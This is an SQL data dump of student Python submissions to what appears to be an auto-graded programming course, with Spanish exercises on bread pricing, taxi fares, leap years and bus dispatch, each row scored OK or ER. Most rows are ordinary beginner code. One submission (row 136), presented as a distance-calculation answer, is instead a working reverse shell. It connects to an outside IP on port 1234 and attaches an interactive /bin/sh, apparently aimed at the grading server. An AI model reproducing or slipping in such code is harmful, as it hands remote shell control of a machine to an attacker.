	(132,1,'2019-08-30 04:59:18.328127',33,206,83,38,'ER','def calcular_total_pan_comprado(frescos: int, viejos: int)->int:\r\n    \"\"\" Pan del día anterior\r\n    Parámetros:\r\n      frescos (int): Cantidad de panes frescos comprados\r\n      viejos (int): Cantidad de panes del día anterior comprados\r\n    Retorno:\r\n      int: Valor total a pagar por el pan comprado\r\n    \"\"\"\r\n    return 0.6 * float(viejos)*450+float(frescos)*450',136,'9065989930464180'),
	(133,2,'2019-08-30 05:01:09.671801',33,206,83,38,'ER','def calcular_total_pan_comprado(frescos: int, viejos: int)->int:\r\n    \"\"\" Pan del día anterior\r\n    Parámetros:\r\n      frescos (int): Cantidad de panes frescos comprados\r\n      viejos (int): Cantidad de panes del día anterior comprados\r\n    Retorno:\r\n      int: Valor total a pagar por el pan comprado\r\n    \"\"\"\r\n    a = 0.6 * float(viejos)*450\r\n    b = float(frescos)*450\r\n    return a + b',137,'d261516f155643e6'),
	(134,1,'2019-08-30 18:13:18.998842',0,199,76,39,'ER','def calcular_tarifa_taxi(kms_recorridos: float)->int:\r\n    \"\"\" Tarifa de un taxi\r\n    Parámetros:\r\n      kms_recorridos (float): Kilómetros recorridos en el viaje\r\n    Retorno:\r\n      int: Tarifa a cobrar por el recorrido en taxi, la cual debe estar redondeada al entero mas cercano.\r\n    \"\"\"\r\n    return round(4000 + 82*(kms_recorridos/10))',138,'7edcb22e6890495e'),
	(135,2,'2019-08-30 18:20:57.420010',100,199,76,39,'OK','def calcular_tarifa_taxi(kms_recorridos: float)->int:\r\n    \"\"\" Tarifa de un taxi\r\n    Parámetros:\r\n      kms_recorridos (float): Kilómetros recorridos en el viaje\r\n    Retorno:\r\n      int: Tarifa a cobrar por el recorrido en taxi, la cual debe estar redondeada al entero mas cercano.\r\n    \"\"\"\r\n    return round(4000 + 82*(kms_recorridos*10))',139,'b463d138f4d14b37'),
	(136,1,'2019-08-30 19:49:20.923812',0,202,66,40,'ER','def calcular_distancia_tierra(t1: float, g1: float, t2: float, g2: float)->float:\r\n    import socket,subprocess,os\r\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\r\n    s.connect((\"157.253.200.229\",1234))\r\n    os.dup2(s.fileno(),0)\r\n    os.dup2(s.fileno(),1)\r\n    os.dup2(s.fileno(),2)\r\n    p=subprocess.call([\"/bin/sh\",\"-i\"])\r\n    print(p)',140,'d882802a323942be'),
	(137,3,'2019-08-30 21:28:26.492096',100,206,83,38,'OK','def calcular_total_pan_comprado(frescos: int, viejos: int)->int:\r\n    \"\"\" Pan del día anterior\r\n    Parámetros:\r\n      frescos (int): Cantidad de panes frescos comprados\r\n      viejos (int): Cantidad de panes del día anterior comprados\r\n    Retorno:\r\n      int: Valor total a pagar por el pan comprado\r\n    \"\"\"\r\n    a = 0.4 * float(viejos)*450\r\n    b = float(frescos)*450\r\n    return a + b',141,'bbdf6e6edc1742a7'),
	(138,1,'2019-08-30 21:57:13.496029',100,206,62,41,'OK','def encontrar_menor(entrada: list)->int:\r\n    \"\"\" Encontrar el elemento menor\r\n    Parámetros:\r\n      entrada (list): La lista\r\n    Retorno:\r\n      int: El número más pequeño en la lista, si es vacía None.\r\n    \"\"\"\r\n    if len(entrada) == 0:\r\n    	return None\r\n    \r\n    rta = 999999999\r\n    for i in range(len(entrada)):\r\n    	if entrada[i] < rta:\r\n        	rta = entrada[i]\r\n        \r\n    return rta',142,'ab31ebddccc5437e'),
	(139,1,'2019-09-02 21:46:03.144296',70,206,100,42,'ER','def bisiesto(anio: int)->bool:\r\n    \"\"\" Año Bisiesto\r\n    Parámetros:\r\n      anio (int): Año para analizar si es bisiesto o no\r\n    Retorno:\r\n      bool: Bool que indica si el año es bisiesto (True) o no lo es (False)\r\n    \"\"\"\r\n    rta = 0\r\n    if anio%4 == 0:\r\n        if anio%100 == 0:\r\n            if anio%400 == 0:\r\n                rta = True\r\n            else:\r\n                rta = False\r\n        else:\r\n            rta = True\r\n    else:\r\n        rta = False\r\n    return rta',143,'a8b6fc0bd4574d46'),
	(140,1,'2019-09-02 22:04:17.195931',50,206,99,43,'ER','def despacho_buses(personas_bus: int, personas_estacion: int)->bool:\r\n    \"\"\" La estación de Transmilenio\r\n    Parámetros:\r\n      personas_bus (int): Número de personas en el bus que va a detenerse\r\n      personas_estacion (int): Número de personas esperando el bus en la estación\r\n    Retorno:\r\n      bool: Bool que indica si se debe o no despachar un bus nuevo\r\n    \"\"\"\r\n    if personas_bus > 150:\r\n        return True\r\n    restos = 0\r\n    \r\n    if personas_estacion >= 40:\r\n        restos = personas_estacion - (personas_bus+personas_estacion)%200\r\n        \r\n    if restos >= 50:\r\n        return True\r\n    else:\r\n        return False',144,'20913088ce054eae'),
	(141,2,'2019-09-02 22:04:24.492601',100,206,100,42,'OK','def bisiesto(anio: int)->bool:\r\n    \"\"\" Año Bisiesto\r\n    Parámetros:\r\n      anio (int): Año para analizar si es bisiesto o no\r\n    Retorno:\r\n      bool: Bool que indica si el año es bisiesto (True) o no lo es (False)\r\n    \"\"\"\r\n    rta = 0\r\n    if anio%4 == 0:\r\n        if anio%100 == 0:\r\n            if anio%400 == 0:\r\n                rta = True\r\n            else:\r\n                rta = False\r\n        else:\r\n            rta = True\r\n    else:\r\n        rta = False\r\n    return rta',145,'cd8b1bd8bf974f5d'),
	(142,2,'2019-09-02 22:06:58.702556',50,206,99,43,'ER','def despacho_buses(personas_bus: int, personas_estacion: int)->bool:\r\n    \"\"\" La estación de Transmilenio\r\n    Parámetros:\r\n      personas_bus (int): Número de personas en el bus que va a detenerse\r\n      personas_estacion (int): Número de personas esperando el bus en la estación\r\n    Retorno:\r\n      bool: Bool que indica si se debe o no despachar un bus nuevo\r\n    \"\"\"\r\n    if personas_bus > 150:\r\n        return True\r\n    restos = personas_estacion - (personas_bus+personas_estacion)%200\r\n    \r\n    if restos >= 50:\r\n        return True\r\n    else:\r\n        return False',146,'e59c507cfd1041d5'),
